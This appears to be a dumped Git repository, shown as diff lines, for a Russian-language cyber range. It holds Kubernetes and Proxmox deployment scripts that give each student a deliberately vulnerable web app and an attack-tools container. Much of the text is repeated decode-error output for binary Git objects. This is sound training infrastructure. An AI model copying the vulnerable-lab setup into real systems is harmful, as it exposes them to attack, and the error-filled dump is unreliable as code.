+        cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
+        chown $(id -u):$(id -g) $HOME/.kube/config
+      become_user: "{{ ansible_user }}"
+
+    - name: Установка Flannel CNI
+      shell: kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml
+      become_user: "{{ ansible_user }}"
+
+    - name: Получение токена для присоединения нод
+      shell: kubeadm token create --print-join-command
+      register: join_command
+
+    - name: Сохранение команды присоединения
+      set_fact:
+        join_command: "{{ join_command.stdout }}"
+      delegate_to: "{{ item }}"
+      delegate_facts: true
+      with_items: "{{ groups['k8s_workers'] }}"
+
+- name: Присоединение worker нод к кластеру
+  hosts: k8s_workers
+  become: yes
+  tasks:
+    - name: Присоединение к кластеру
+      shell: "{{ hostvars[groups['k8s_master'][0]]['join_command'] }}"
+      when: join_command is defined
+```
+
+hosts.yml:
+```
+all:
+  children:
+    proxmox:
+      hosts:
+        proxmox-node:
+          ansible_host: 158.255.0.220        # Адрес хоста Proxmox
+          ansible_user: root                # Пользователь Proxmox (root)
+    k8s_cluster:
+      children:
+        k8s_master:
+          hosts:
+            k8s-master-1:
+              ansible_host: 192.168.10.10
+              ansible_user: ubuntu
+#            k8s-master-2:
+#              ansible_host: 192.168.10.11   # Второй master-нода
+#            k8s-master-3:
+#              ansible_host: 192.168.10.12   # Третий master-нода
+        k8s_workers:
+          hosts:
+            k8s-worker-1:
+              ansible_host: 192.168.10.20
+              ansible_user: ubuntu
+#            k8s-worker-2:
+#              ansible_host: 192.168.10.21   # Второй worker-нода
+#            k8s-worker-3:
+#              ansible_host: 192.168.10.22   # Третий worker-нода
+
+```
+
+.DS_Store:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x99 in position 563: invalid start byte
+```
+
+restore.sh:
+```
+
+```
+
+backup.sh:
+```
+
+```
+
+cleanup.sh:
+```
+
+```
+
+deploy.sh:
+```
+#!/bin/bash
+set -e
+
+# Цвета для вывода
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # No Color
+
+# Функция для вывода сообщений
+log() {
+    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}"
+}
+
+warn() {
+    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] WARNING: $1${NC}"
+}
+
+error() {
+    echo -e "${RED}[$(date +'%Y-%m-%d %H:%M:%S')] ERROR: $1${NC}"
+    exit 1
+}
+
+# Проверка зависимостей
+check_dependencies() {
+    log "Проверка зависимостей..."
+
+    if ! command -v terraform &> /dev/null; then
+        error "Terraform не установлен. Установите Terraform версии >= 1.0"
+    fi
+
+    if ! command -v ansible &> /dev/null; then
+        error "Ansible не установлен. Установите Ansible версии >= 4.0"
+    fi
+
+    if ! command -v kubectl &> /dev/null; then
+        error "kubectl не установлен. Установите kubectl"
+    fi
+
+    if ! command -v docker &> /dev/null; then
+        error "Docker не установлен. Установите Docker"
+    fi
+
+    log "Все зависимости установлены"
+}
+
+# Проверка конфигурации
+check_config() {
+    log "Проверка конфигурации..."
+
+    if [ ! -f "terraform/proxmox/terraform.tfvars" ]; then
+        warn "Файл terraform.tfvars не найден. Создаем из примера..."
+        cp terraform/proxmox/terraform.tfvars.example terraform/proxmox/terraform.tfvars
+        error "Отредактируйте terraform/proxmox/terraform.tfvars и запустите снова"
+    fi
+
+    if [ ! -f "ansible/inventories/production/hosts.yml" ]; then
+        error "Файл инвентаря Ansible не найден. Создайте ansible/inventories/production/hosts.yml"
+    fi
+
+    log "Конфигурация проверена"
+}
+
+# Развертывание инфраструктуры через Terraform
+deploy_infrastructure() {
+    log "Развертывание инфраструктуры через Terraform..."
+
+    cd terraform/proxmox
+
+    log "Инициализация Terraform..."
+    terraform init
+
+    log "Планирование изменений..."
+    terraform plan -out=plan.out
+
+    log "Применение изменений..."
+    terraform apply plan.out
+
+    log "Получение выходных данных..."
+    terraform output -json > ../../infrastructure-outputs.json
+
+    cd ../..
+    log "Инфраструктура развернута"
+}
+
+# Настройка окружения через Ansible
+configure_environment() {
+    log "Настройка окружения через Ansible..."
+
+    cd ansible
+
+    log "Проверка подключения к хостам..."
+    ansible all -i inventories/production/hosts.yml -m ping
+
+    log "Запуск основного playbook..."
+    ansible-playbook -i inventories/production/hosts.yml playbooks/site.yml
+
+    cd ..
+    log "Окружение настроено"
+}
+
+# Настройка Kubernetes
+setup_kubernetes() {
+    log "Настройка Kubernetes кластера..."
+
+    # Получаем kubeconfig с мастер ноды
+    log "Получение kubeconfig..."
+    MASTER_IP=$(jq -r '.k8s_master_ips.value[0]' infrastructure-outputs.json)
+
+    if [ "$MASTER_IP" == "null" ] || [ -z "$MASTER_IP" ]; then
+        error "Не удалось получить IP мастер ноды"
+    fi
+
+    scp ubuntu@$MASTER_IP:~/.kube/config ~/.kube/config
+
+    log "Применение Kubernetes манифестов..."
+    kubectl apply -f kubernetes/manifests/namespaces/
+    kubectl apply -f kubernetes/manifests/network-policies/
+    kubectl apply -f kubernetes/manifests/monitoring/
+
+    log "Установка Helm чартов..."
+    helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
+    helm repo add grafana https://grafana.github.io/helm-charts
+    helm repo update
+
+    helm install prometheus prometheus-community/kube-prometheus-stack \
+        --namespace monitoring --create-namespace
+
+    log "Kubernetes настроен"
+}
+
+# Развертывание приложений
+deploy_applications() {
+    log "Развертывание приложений..."
+
+    # Сборка и загрузка Docker образов
+    log "Сборка Docker образов..."
+    docker build -t cyber-range/vulnerable-web:latest docker/images/vulnerable-web/
+    docker build -t cyber-range/attack-tools:latest docker/images/attack-tools/
+
+    # Развертывание через Kubernetes манифесты
+    kubectl apply -f kubernetes/manifests/applications/
+
+    log "Приложения развернуты"
+}
+
+# Проверка развертывания
+verify_deployment() {
+    log "Проверка развертывания..."
+
+    log "Статус нод Kubernetes:"
+    kubectl get nodes
+
+    log "Статус подов:"
+    kubectl get pods --all-namespaces
+
+    log "Статус сервисов:"
+    kubectl get services --all-namespaces
+
+    log "Получение URL для доступа..."
+    GRAFANA_URL=$(kubectl get service -n monitoring prometheus-grafana -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
+
+    if [ ! -z "$GRAFANA_URL" ]; then
+        log "Grafana доступен по адресу: http://$GRAFANA_URL:3000"
+        log "Логин: admin / Пароль: получите командой 'kubectl get secret -n monitoring prometheus-grafana -o jsonpath="{.data.admin-password}" | base64 --decode'"
+    fi
+
+    log "Развертывание завершено успешно!"
+}
+
+# Главная функция
+main() {
+    log "Начало развертывания киберполигона..."
+
+    check_dependencies
+    check_config
+    deploy_infrastructure
+    configure_environment
+    setup_kubernetes
+    deploy_applications
+    verify_deployment
+
+    log "Развертывание завершено!"
+}
+
+# Обработка аргументов командной строки
+case "${1:-}" in
+    "infra")
+        deploy_infrastructure
+        ;;
+    "config")
+        configure_environment
+        ;;
+    "k8s")
+        setup_kubernetes
+        ;;
+    "apps")
+        deploy_applications
+        ;;
+    "verify")
+        verify_deployment
+        ;;
+    "full"|"")
+        main
+        ;;
+    *)
+        echo "Использование: $0 [infra|config|k8s|apps|verify|full]"
+        echo "  infra  - Развертывание инфраструктуры"
+        echo "  config - Настройка окружения"
+        echo "  k8s    - Настройка Kubernetes"
+        echo "  apps   - Развертывание приложений"
+        echo "  verify - Проверка развертывания"
+        echo "  full   - Полное развертывание (по умолчанию)"
+        exit 1
+        ;;
+esac
+```
+
+create-student-env.sh:
+```
+#!/bin/bash
+set -e
+
+# Цвета для вывода
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+RED='\033[0;31m'
+NC='\033[0m'
+
+log() {
+    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}"
+}
+
+warn() {
+    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] WARNING: $1${NC}"
+}
+
+error() {
+    echo -e "${RED}[$(date +'%Y-%m-%d %H:%M:%S')] ERROR: $1${NC}"
+    exit 1
+}
+
+# Функция для создания студенческого окружения
+create_student_environment() {
+    local student_id=$1
+    local lab_type=$2
+
+    if [ -z "$student_id" ] || [ -z "$lab_type" ]; then
+        error "Использование: $0 <student_id> <lab_type>"
+    fi
+
+    log "Создание окружения для студента $student_id, тип лабораторной: $lab_type"
+
+    # Создание namespace
+    kubectl create namespace "student-$student_id" --dry-run=client -o yaml | kubectl apply -f -
+
+    # Создание network policy для изоляции
+    cat <<EOF | kubectl apply -f -
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: student-$student_id-isolation
+  namespace: student-$student_id
+spec:
+  podSelector: {}
+  policyTypes:
+  - Ingress
+  - Egress
+  egress:
+  - to: []
+    ports:
+    - protocol: TCP
+      port: 53
+    - protocol: UDP
+      port: 53
+  - to: []
+    ports:
+    - protocol: TCP
+      port: 80
+    - protocol: TCP
+      port: 443
+  ingress:
+  - from:
+    - namespaceSelector:
+        matchLabels:
+          name: monitoring
+EOF
+
+    # Создание resource quota
+    cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: ResourceQuota
+metadata:
+  name: student-$student_id-quota
+  namespace: student-$student_id
+spec:
+  hard:
+    requests.cpu: "2"
+    requests.memory: 4Gi
+    limits.cpu: "4"
+    limits.memory: 8Gi
+    count/pods: "5"
+    count/services: "3"
+EOF
+
+    # Развертывание приложений в зависимости от типа лабораторной
+    case $lab_type in
+        "web-security")
+            deploy_web_security_lab $student_id
+            ;;
+        "network-security")
+            deploy_network_security_lab $student_id
+            ;;
+        "malware-analysis")
+            deploy_malware_analysis_lab $student_id
+            ;;
+        *)
+            error "Неизвестный тип лабораторной: $lab_type"
+            ;;
+    esac
+
+    log "Окружение для студента $student_id создано"
+
+    # Вывод информации для подключения
+    show_student_info $student_id
+}
+
+# Развертывание лабораторной по веб-безопасности
+deploy_web_security_lab() {
+    local student_id=$1
+
+    log "Развертывание лабораторной по веб-безопасности..."
+
+    cat <<EOF | kubectl apply -f -
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: vulnerable-web
+  namespace: student-$student_id
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: vulnerable-web
+  template:
+    metadata:
+      labels:
+        app: vulnerable-web
+    spec:
+      containers:
+      - name: vulnerable-web
+        image: cyber-range/vulnerable-web:latest
+        ports:
+        - containerPort: 5000
+        resources:
+          requests:
+            cpu: 100m
+            memory: 128Mi
+          limits:
+            cpu: 500m
+            memory: 512Mi
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: vulnerable-web-svc
+  namespace: student-$student_id
+spec:
+  selector:
+    app: vulnerable-web
+  ports:
+  - port: 80
+    targetPort: 5000
+  type: ClusterIP
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: attack-tools
+  namespace: student-$student_id
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: attack-tools
+  template:
+    metadata:
+      labels:
+        app: attack-tools
+    spec:
+      containers:
+      - name: kali-tools
+        image: cyber-range/attack-tools:latest
+        stdin: true
+        tty: true
+        resources:
+          requests:
+            cpu: 200m
+            memory: 256Mi
+          limits:
+            cpu: 1000m
+            memory: 1Gi
+EOF
+}
+
+# Развертывание лабораторной по сетевой безопасности
+deploy_network_security_lab() {
+    local student_id=$1
+
+    log "Развертывание лабораторной по сетевой безопасности..."
+
+    # Здесь будет более сложная конфигурация с несколькими подами
+    # для симуляции сетевой инфраструктуры
+}
+
+# Показ информации для студента
+show_student_info() {
+    local student_id=$1
+
+    log "Информация для подключения студента $student_id:"
+
+    echo "=================================="
+    echo "Namespace: student-$student_id"
+    echo "=================================="
+
+    kubectl get pods -n "student-$student_id"
+    kubectl get services -n "student-$student_id"
+
+    # Получение URL для доступа к приложениям
+    if kubectl get service vulnerable-web-svc -n "student-$student_id" &>/dev/null; then
+        CLUSTER_IP=$(kubectl get service vulnerable-web-svc -n "student-$student_id" -o jsonpath='{.spec.clusterIP}')
+        echo "Vulnerable Web App: http://$CLUSTER_IP"
+    fi
+
+    # Команда для подключения к attack tools
+    if kubectl get deployment attack-tools -n "student-$student_id" &>/dev/null; then
+        echo "Для подключения к attack tools выполните:"
+        echo "kubectl exec -it -n student-$student_id deployment/attack-tools -- /bin/bash"
+    fi
+}
+
+# Удаление студенческого окружения
+cleanup_student_environment() {
+    local student_id=$1
+
+    if [ -z "$student_id" ]; then
+        error "Укажите ID студента для удаления"
+    fi
+
+    warn "Удаление окружения студента $student_id..."
+
+    kubectl delete namespace "student-$student_id" --ignore-not-found=true
+
+    log "Окружение студента $student_id удалено"
+}
+
+# Обработка аргументов
+case "${1:-}" in
+    "create")
+        create_student_environment "$2" "$3"
+        ;;
+    "cleanup")
+        cleanup_student_environment "$2"
+        ;;
+    "info")
+        show_student_info "$2"
+        ;;
+    *)
+        echo "Использование: $0 <action> [arguments]"
+        echo "Actions:"
+        echo "  create <student_id> <lab_type>  - Создать окружение"
+        echo "  cleanup <student_id>            - Удалить окружение"
+        echo "  info <student_id>               - Показать информацию"
+        echo ""
+        echo "Lab types: web-security, network-security, malware-analysis"
+        exit 1
+        ;;
+esac
+```
+
+setup-cluster.sh:
+```
+
+```
+
+.DS_Store:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd9 in position 1065: invalid continuation byte
+```
+
+ORIG_HEAD:
+```
+82355aefcda19ec7503d4bfa701abc0c74073cd7
+
+```
+
+config:
+```
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	ignorecase = true
+	precomposeunicode = true
+[remote "origin"]
+	url = https://github.com/Zikkyrat4/cyber-net.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+	remote = origin
+	merge = refs/heads/main
+
+```
+
+HEAD:
+```
+ref: refs/heads/main
+
+```
+
+description:
+```
+Unnamed repository; edit this file 'description' to name the repository.
+
+```
+
+index:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xe5 in position 13: invalid continuation byte
+```
+
+COMMIT_EDITMSG:
+```
+add socket for terraform VM and fix docs
+
+```
+
+FETCH_HEAD:
+```
+4bdedf3300527f3f1fd2c2efa32ec4f5f325e6d7		branch 'main' of https://github.com/Zikkyrat4/cyber-net
+
+```
+
+ba0cceb69f9d1a94e74ac8e4981b443c6a3e98:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+998ef0f12f890723d196294a07c788812c9756:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xed in position 2: invalid continuation byte
+```
+
+2908911f6905ef76080ffab64cbfcd779e65b5:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xce in position 18: invalid continuation byte
+```
+
+251c1400b47323d298f64e18e6fe016ed63a23:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+90af4113ca56c693d3cbeeabfc756c46054906:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb5 in position 2: invalid start byte
+```
+
+a217ec921921fa5d547a45cec7253aa87ed4e4:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+6147d3abc64f52bc026550886da15e8cd95528:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+75e77e9320340d20ea87a6da1d0d8510469030:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xdd in position 2: invalid continuation byte
+```
+
+b3aa9f36ee50eb40bd95d745396e1f44944e28:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xed in position 2: invalid continuation byte
+```
+
+68372f55f9ca4331932e19bbfafab4f320cde5:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb0 in position 7: invalid start byte
+```
+
+c8581461b5d252e5d4b532d579889ff6c3c2ea:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xbd in position 2: invalid start byte
+```
+
+cf222e68919750489fb0684c6a8c31790cba14:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte
+```
+
+1215c9fc269aec3607ff0388eb99cb701a1584:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xa5 in position 2: invalid start byte
+```
+
+e625660adc0624ec0054c2a9bdccbfccb69330:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 18: invalid continuation byte
+```
+
+d813c32d3d7043d0a2d1326744a1f3b797566b:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+1959552e5efd221c0c0b2435b329758375c869:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+adeda1c29d755672f509693291799493dce277:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xca in position 20: invalid continuation byte
+```
+
+cc0943c2ea3c013a5221b54a40210d395a926e:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x93 in position 3: invalid start byte
+```
+
+291bab1e6a0c6145bb09ae2eaf9bcbb0b4435b:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb0 in position 7: invalid start byte
+```
+
+4ecd96aa2a2e245e5b81ff4cd0275ca7a3da40:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc9 in position 18: invalid continuation byte
+```
+
+573504d1469c48418efc8d3e68ade7245b875d:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+ee0cdfe90d2541a3a3d81694841a740a5cb63e:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x93 in position 3: invalid start byte
+```
+
+c98892503ad5ba96fe2393781ab480e63f3d04:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+280692173e2c0d3c77f5e40ce0cfd6b69fcece:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+56515f7aa628ddf44467a031a0c625f1129c3a:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+9668e2278041802323949669806842cca3160e:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+80e9e5089c1d66c6d043879043810ba65c7f0c:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xad in position 2: invalid start byte
+```
+
+bbfa2b055628df93d3f28c975489e427f00612:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xca in position 20: invalid continuation byte
+```
+
+2dd2810f6e368205b51ca6ca8d7728718f3a7f:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+7760cee3fea4507eea0dddebe13499cf18f493:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc9 in position 18: invalid continuation byte
+```
+
+ecfc22128dc8769bdab42d61ab2afe7df3453e:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb5 in position 2: invalid start byte
+```
+
+912c84926bb638bd031db066ea366f78a99588:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb0 in position 7: invalid start byte
+```
+
+c494c1aca8a82a86a4216010839fc9bbb7f18c:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 21: invalid continuation byte
+```
+
+783ffd67c8ffd2d55b5e0e6f7ed5ca23802aaf:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+98e615ba3a72cf46207fdd1ad2c6c0cfa06a3d:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x8d in position 2: invalid start byte
+```
+
+b472a9126ef80121b6857df089757ff84ae293:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x90 in position 3: invalid start byte
+```
+
+1663ea6ee55ff1ee76ae13642d597ff5934049:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb5 in position 2: invalid start byte
+```
+
+29ff1f76acf9e286260f853f09b5e81edc25cf:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+122d6985fd90c284beed975ae8d3ab336de091:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte
+```
+
+3772e54a68c559c48e8bb80fba2caa82235bb1:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+ad2108dbe58726db4c02d5f6c3d02d08970b48:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x93 in position 3: invalid start byte
+```
+
+142a41baea3cdbdf9e88b3b677235cca6ee6b6:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xca in position 20: invalid continuation byte
+```
+
+7ff754173cbe212552e889da671c03e67bb3d9:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb0 in position 7: invalid start byte
+```
+
+3cb2f9bfa5ebe8766b83a2bd18e08d13ce7b1c:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb0 in position 7: invalid start byte
+```
+
+51f2c6413619d699b8f88834df350b2584512b:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xad in position 2: invalid start byte
+```
+
+dedf3300527f3f1fd2c2efa32ec4f5f325e6d7:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x93 in position 3: invalid start byte
+```
+
+a43887e75cdef50e3a79878d5f2e7ced121bbe:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+e4972684193734d507d244654eb33ffc7ed877:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+c4e004339083978ea21acf40c209603c8a82e0:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd5 in position 24: invalid continuation byte
+```
+
+897344c5640264af81d94c212af9ff4466e9df:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb0 in position 9: invalid start byte
+```
+
+67f8700ca09bc5a2fedb379fd7e167d6df5e67:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte
+```
+
+3f183b44d460930482898283c5bbc13f94efb6:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x93 in position 3: invalid start byte
+```
+
+71b9f548beaa2344416bbde7086d8c8a5f1b20:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+3ddfc24066a27014cb103b87ea10fd0039f022:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb5 in position 2: invalid start byte
+```
+
+d25ed309aafd88dd2e7eda6fd357d1f58a62d8:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+bbd5708aedc416bc174468a954df85b0abcf6e:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte
+```
+
+43b34b0b77e34c1b5b96c31eacfe67704967fb:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd5 in position 2: invalid continuation byte
+```
+
+77a1cf1186163f2945d10194ed3a852d14c820:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 17: invalid continuation byte
+```
+
+269e41758a4f86a3af3b8dda36fe252a396d54:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+cff7a0b8b1d556e97df16999d96c3001aa9ae9:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc1 in position 4: invalid start byte
+```
+
+1cc79f863f6096dab67bd19a4fef44e4e41a99:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+57c45588ab027e3eabab72aa716a31cce8aabe:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+05cc777b3543dd607bb68b9d62c57ea8b5fe2b:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+30727495f98affbd326a658a223e58c8e4f481:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+a947289124772889891f260f4c8f0dda234040:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte
+```
+
+e4f449b806c9dd51acccee8264fcce786b17ff:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+67ef424bce6791893e9a57bb952f80fd536e93:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xca in position 3: invalid continuation byte
+```
+
+5ddf0262eda430fcf10ba89f479b2e8a0a628c:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte
+```
+
+abfcb86c852cf4fe96e02f2b85eb73a3c3d03a:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc9 in position 19: invalid continuation byte
+```
+
+dc1f90dcc1c3c66ff7ee0963bd3d880288f3c7:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 18: invalid continuation byte
+```
+
+7bb8161a21bdc551e07a408dc68aa3a67e4fe0:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+95aceed4eaf204846cebaae7d3e89d08a050cd:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb0 in position 7: invalid start byte
+```
+
+f2fd95d8b31ef40f7a947a59317d4876893cb6:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb5 in position 2: invalid start byte
+```
+
+598137d52788f14f90b20506da27b2e61a8945:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb6 in position 8: invalid start byte
+```
+
+207320b7b12e890a1be433ae7f4fb485791ea6:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+4128d55a8f1af04b5bc495776c914c833eef84:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb1 in position 8: invalid start byte
+```
+
+827fb23fa24628c19b6c032bca076ae96aa114:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xbd in position 2: invalid start byte
+```
+
+45eddc5004d1d3b7325b1b590f962d8008bd6a:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+f6d0cfa13ddb09f974ca58317fce5df0daf2c3:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+93f8bb33e105fb3156e73a8eb09cad60f04b2f:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+7fea328d2ed88ec9f965ed92e2c1d96fd589b9:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x93 in position 3: invalid start byte
+```
+
+ad67963160c106ec92edd4e1e8e4e39f248f17:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xce in position 21: invalid continuation byte
+```
+
+602a57ea10b6c73a3704f166fba9586434b320:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xed in position 2: invalid continuation byte
+```
+
+08da82c73e353416cede77a94a30b86f4034e6:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+9da6f03cd63ad4a5e1d101d12197d532bfd091:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+7e7b7cbd44b0544f5b16a5b0bad59025e4f1c4:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+5c164e383a53c5938b78bbc6e64093bfaa953a:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xbd in position 2: invalid start byte
+```
+
+4c8595a8b98c3a406978399134f25c93be906d:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 18: invalid continuation byte
+```
+
+24e03ec771472ad9c90a3b35ac489107618124:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 18: invalid continuation byte
+```
+
+e41c2e1cca503e4f491374abb43d37ab3633bb:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+af5d3046d346e065af625e9033c5bf7d3f05d3:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb0 in position 7: invalid start byte
+```
+
+27b9312b735442710ad9339688f34cbae939f6:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xf0 in position 18: invalid continuation byte
+```
+
+9a56f1feb06c77486457c561226e54b04fde0c:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+def460b213f0fb60843c727a35e163cda4bd55:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte
+```
+
+b226e18e1b8b53b198b1c901266f7ed7761c10:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+e8a4b2742ee1b924ab8788a38051efaeda81ed:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte
+```
+
+939233df2757b33d5f88688c7fb537758f304f:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte
+```
+
+a8b83c7a95fb63284840e9ac6430b75887f720:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xdd in position 2: invalid continuation byte
+```
+
+c4d14a314b8876e5c0e9226aff09def490422b:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+6fa0a21b9acdf82fd2a707e463768c46148bd4:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 18: invalid continuation byte
+```
+
+44433c780b19ad80d51d81f4b2c5db9e8a049e:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 18: invalid continuation byte
+```
+
+a6753c508c47de4e79685a749613327b0b9a8d:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+9de29bb2d1d6434b8b29ae775ad8c2e48c5391:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xca in position 3: invalid continuation byte
+```
+
